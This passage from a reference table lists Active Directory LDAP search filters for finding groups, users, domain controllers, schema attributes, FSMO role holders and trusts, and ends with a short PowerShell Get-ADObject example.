| All universal security groups (Notes 17, 19)                 | (groupType=-2147483640)                                      |
| All domain local security groups  (Notes 17, 19)             | (groupType=-2147483644)                                      |
| All global distribution groups (Note 19)                     | (groupType=2)                                                |
| All objects with service principal name                      | (servicePrincipalName=*)                                     |
| Users with "Allow Access" on "Dial-in"  tab of ADUC  (Note 6) | (&(objectCategory=person)(objectClass=user)  (msNPAllowDialin=TRUE)) |
| Users with "Control access though  NPS Network Policy" on "Dial-in" tab of ADUC | (&(objectCategory=person)(objectClass=user)  (!(msNPAllowDialin=*))) |
| All groups created after March 1, 2011                       | (&(objectCategory=group)  (whenCreated>=20110301000000.0Z))  |
| All users that must change their password  at next logon     | (&(objectCategory=person)(objectClass=user)  (pwdLastSet=0)) |
| All users that changed their password since  April 15, 2011 (CST) (Note 7) | (&(objectCategory=person)(objectClass=user)  (pwdLastSet>=129473172000000000)) |
| All users with "primary" group  other than "Domain Users"    | (&(objectCategory=person)(objectClass=user)  (!(primaryGroupID=513))) |
| All computers with "primary" group  "Domain Computers"       | (&(objectCategory=computer)  (primaryGroupID=515))           |
| Object with GUID  "90395F191AB51B4A9E9686C66CB18D11"  (Note 8) | (objectGUID=\90\39\5F\19\1A\B5\1B\4A\9E\96  \86\C6\6C\B1\8D\11) |
| Object beginning with GUID  "90395F191AB51B4A"  (Note 8)     | (objectGUID=\90\39\5F\19\1A\B5\1B\4A*)                       |
| Object with SID "S-1-5-21-73586283  -152049171-839522115-1111" (Note 9) | (objectSID=S-1-5-21-73586283-152049171  -839522115-1111)     |
| Object with SID "010500000000000515000  0006BD662041316100943170A3257040000"  (Note 9) | (objectSID=\01\05\00\00\00\00\00\05\15  \00\00\00\6B\D6\62\04\13\16\10\09\43\17\0A\32  \57\04\00\00) |
| All computers that are not  Domain Controllers (Note 4)      | (&(objectCategory=computer)  (!(userAccountControl:1.2.840.113556.1.4.803:=8192))) |
| All Domain Controllers (Note 4)                              | (&(objectCategory=computer)  (userAccountControl:1.2.840.113556.1.4.803:=8192)) |
| All Domain Controllers (Notes 14, 19)                        | (primaryGroupID=516)                                         |
| All servers                                                  | (&(objectCategory=computer)  (operatingSystem=*server*))     |
| All member servers (not DC's) (Note 4)                       | (&(objectCategory=computer)  (operatingSystem=*server*)  (!(userAccountControl:1.2.840.113556.1.4.803:=8192))) |
| All direct members of specified group                        | (memberOf=cn=Test,ou=East,dc=Domain,dc=com)                  |
| All users not direct members of  a specified group           | (&(objectCategory=person)(objectClass=user)  (!(memberOf=cn=Test,ou=East,dc=Domain,dc=com))) |
| All groups with specified direct member  (Note 19)           | (member=cn=Jim Smith,ou=West,  dc=Domain,dc=com)             |
| All members of specified group, including  due to group nesting (Note 10) | (memberOf:1.2.840.113556.1.4.1941:=  cn=Test,ou=East,dc=Domain,dc=com) |
| All groups specified user belongs to,  including due to group nesting (Notes 10, 19) | (member:1.2.840.113556.1.4.1941:=  cn=Jim Smith,ou=West,dc=Domain,dc=com) |
| Objects with givenName "Jim*" and sn  "Smith*", or with cn "Jim Smith*" (Note 11) | (anr=Jim Smith)                                              |
| All attributes in the Schema container  replicated to the GC (Notes 6, 12) | (&(objectCategory=attributeSchema)  (isMemberOfPartialAttributeSet=TRUE)) |
| All operational (constructed) attributes in  the Schema container (Notes 4, 12) | (&(objectCategory=attributeSchema)  (systemFlags:1.2.840.113556.1.4.803:=4)) |
| All attributes in the Schema container not  replicated to other Domain Controllers  (Notes 4, 12) | (&(objectCategory=attributeSchema)  (systemFlags:1.2.840.113556.1.4.803:=1)) |
| All objects where deletion is not allowed  (Notes 4)         | (systemFlags:1.2.840.113556.1.4.803:=2147483648)             |
| Attributes whose values are copied when  the object is copied (Notes 4, 12) | (searchFlags:1.2.840.113556.1.4.803:=16)                     |
| Attributes preserved in tombstone object  when object deleted (Notes 4, 12) | (searchFlags:1.2.840.113556.1.4.803:=8)                      |
| Attributes in the Ambiguous Name  Resolution (ANR) set (Notes 4, 12) | (searchFlags:1.2.840.113556.1.4.803:=4)                      |
| Attributes in the Schema that are  indexed (Notes 4, 12)     | (searchFlags:1.2.840.113556.1.4.803:=1)                      |
| Attributes marked confidential in  the schema (Notes 4, 12)  | (searchFlags:1.2.840.113556.1.4.803:=128)                    |
| Attributes in the RODC filtered attribute  set, or FAS (Notes 4, 12) | (searchFlags:1.2.840.113556.1.4.803:=512)                    |
| All site links in the Configuration  container (Note 13)     | (objectClass=siteLink)                                       |
| The nTDSDSA objects associated with  all Global Catalogs. This will identify all DC's  that are GC's. (Note 4) | (&(objectCategory=nTDSDSA)  (options:1.2.840.113556.1.4.803:=1)) |
| The nTDSDSA object associated with the  PDC Emulator. This will identify the DC  with the PDC Emulator FSMO role (Note 18). | (&(objectClass=domainDNS)(fSMORoleOwner=*))                  |
| The nTDSDSA object associated with the  RID Master. This will identify the DC  with the RID Master FSMO role (Note 18). | (&(objectClass=rIDManager)(fSMORoleOwner=*))                 |
| The nTDSDSA object associated with the  Infrastructure Master. This will identify the DC  with this FSMO role (Note 18). | (&(objectClass=infrastructureUpdate)  (fSMORoleOwner=*))     |
| The nTDSDSA object associated with the  Schema Master. This will identify the DC with  the Schema Master FSMO role (Note 18). | (&(objectClass=dMD)(fSMORoleOwner=*))                        |
| The nTDSDSA object associated with the  Domain Naming Master. This will identify the  DC with this FSMO role (Note 18). | (&(objectClass=crossRefContainer)  (fSMORoleOwner=*))        |
| All Exchange servers in the Configuration  container (Note 13) | (objectCategory=msExchExchangeServer)                        |
| All objects protected by AdminSDHolder                       | (adminCount=1)                                               |
| All trusts established with a domain                         | (objectClass=trustedDomain)                                  |
| All Group Policy objects                                     | (objectCategory=groupPolicyContainer)                        |
| All service connection point objects                         | (objectClass=serviceConnectionPoint)                         |
| All Read-Only Domain Controllers  (Notes 4, 19)              | (userAccountControl:1.2.840.113556.1.4.803:=67108864)        |

```
Import-Module ActiveDirectory
Get-ADObject -LDAPFilter "(objectClass=user)"
```
